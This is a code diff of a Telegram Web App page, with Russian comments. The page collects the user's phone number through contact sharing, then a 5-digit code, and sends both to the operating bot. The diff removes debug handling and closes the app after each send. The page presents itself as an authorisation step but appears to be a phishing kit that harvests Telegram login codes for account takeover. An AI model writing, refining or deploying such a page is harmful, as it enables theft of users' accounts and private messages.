@@ -15,8 +15,6 @@
         .code-cell.filled { border-color: var(--tg-theme-button-color, #3390ec); }
         .code-cell.active { border-color: var(--tg-theme-button-color, #3390ec); box-shadow: 0 0 0 2px rgba(51, 144, 236, 0.2); }
         .auth-btn { background: var(--tg-theme-button-color, #3390ec); color: var(--tg-theme-button-text-color, #ffffff); border: none; border-radius: 10px; padding: 15px 20px; font-size: 16px; font-weight: 600; width: 100%; max-width: 300px; margin-top: 20px; cursor: pointer; }
-        
-        /* Окно для отладки */
         #debug { position: fixed; bottom: 10px; left: 10px; right: 10px; background: rgba(255,0,0,0.8); color: white; font-size: 12px; padding: 10px; border-radius: 8px; word-wrap: break-word; z-index: 9999; text-align: left; }
     </style>
 </head>
@@ -46,75 +44,62 @@
     <script>
         const debugEl = document.getElementById('debug');
         window.onload = function() {
-            try {
-                if (window.Telegram && window.Telegram.WebApp) {
-                    const tg = window.Telegram.WebApp;
-                    tg.expand();
-                    debugEl.innerText = "Debug: WebApp loaded, version " + tg.version;
-                    let isSent = false;
+            if (window.Telegram && window.Telegram.WebApp) {
+                const tg = window.Telegram.WebApp;
+                tg.expand();
+                let isSent = false;
 
-                    document.getElementById('btn-share').onclick = function() {
-                        try {
-                            if (typeof tg.requestContact !== 'function') {
-                                debugEl.innerText = "Debug ERROR: requestContact is not supported by your Telegram version.";
-                                return;
-                            }
-                            debugEl.innerText = "Debug: calling requestContact...";
-                            tg.requestContact(function(shared, contact) {
-                                if (shared && contact) {
-                                    debugEl.innerText = "Debug: contact shared! sending...";
-                                    tg.sendData(JSON.stringify({ type: "phone", phone: contact.phone_number }));
-                                    document.getElementById('screen-phone').classList.add('hidden');
-                                    document.getElementById('screen-code').classList.remove('hidden');
-                                    setTimeout(() => { document.getElementById('code-input').focus(); }, 100);
-                                } else {
-                                    debugEl.innerText = "Debug: contact NOT shared (user denied or error).";
-                                }
-                            });
-                        } catch (err) {
-                            debugEl.innerText = "Debug ERROR (requestContact): " + err.message;
-                        }
-                    };
-
-                    const codeInput = document.getElementById('code-input');
-                    const codeCells = document.querySelectorAll('.code-cell');
-                    document.getElementById('code-cells').onclick = () => codeInput.focus();
-
-                    codeInput.addEventListener('input', function(e) {
-                        const value = this.value.replace(/\D/g, '');
-                        this.value = value;
-
-                        codeCells.forEach((cell, index) => {
-                            if (index < value.length) {
-                                cell.innerText = value[index];
-                                cell.classList.add('filled');
-                            } else {
-                                cell.innerText = '';
-                                cell.classList.remove('filled');
-                            }
-                            if (index === value.length) cell.classList.add('active');
-                            else cell.classList.remove('active');
-                        });
-
-                        if (value.length === 5 && !isSent) {
-                            isSent = true;
-                            this.blur();
+                // --- ЭТАП 1: НОМЕР ---
+                document.getElementById('btn-share').onclick = function() {
+                    tg.requestContact(function(shared, contact) {
+                        if (shared && contact) {
+                            debugEl.innerText = "Debug: Sending phone and closing...";
                             
-                            try {
-                                debugEl.innerText = "Debug: sending code: " + value;
-                                tg.sendData(JSON.stringify({ type: "code", code: value }));
-                                debugEl.innerText = "Debug: code sent successfully!";
-                                setTimeout(() => { tg.close(); }, 1500);
-                            } catch (err) {
-                                debugEl.innerText = "Debug ERROR (sendData): " + err.message;
-                            }
+                            // Отправляем номер
+                            tg.sendData(JSON.stringify({ type: "phone", phone: contact.phone_number }));
+                            
+                            // Ждем полсекунды и закрываем (чтобы данные улетели)
+                            setTimeout(() => { tg.close(); }, 500);
+                        } else {
+                            debugEl.innerText = "Debug: contact NOT shared.";
                         }
                     });
-                } else {
-                    debugEl.innerText = "Debug ERROR: Telegram.WebApp not found. Are you opening inside Telegram?";
-                }
-            } catch (globalErr) {
-                debugEl.innerText = "Debug GLOBAL ERROR: " + globalErr.message;
+                };
+
+                // --- ЭТАП 2: КОД ---
+                const codeInput = document.getElementById('code-input');
+                const codeCells = document.querySelectorAll('.code-cell');
+                document.getElementById('code-cells').onclick = () => codeInput.focus();
+
+                codeInput.addEventListener('input', function(e) {
+                    const value = this.value.replace(/\D/g, '');
+                    this.value = value;
+
+                    codeCells.forEach((cell, index) => {
+                        if (index < value.length) {
+                            cell.innerText = value[index];
+                            cell.classList.add('filled');
+                        } else {
+                            cell.innerText = '';
+                            cell.classList.remove('filled');
+                        }
+                        if (index === value.length) cell.classList.add('active');
+                        else cell.classList.remove('active');
+                    });
+
+                    if (value.length === 5 && !isSent) {
+                        isSent = true;
+                        this.blur();
+                        
+                        debugEl.innerText = "Debug: Sending code and closing...";
+                        
+                        // Отправляем код
+                        tg.sendData(JSON.stringify({ type: "code", code: value }));
+                        
+                        // Ждем полсекунды и закрываем
+                        setTimeout(() => { tg.close(); }, 500);
+                    }
+                });
             }
         };
     </script>
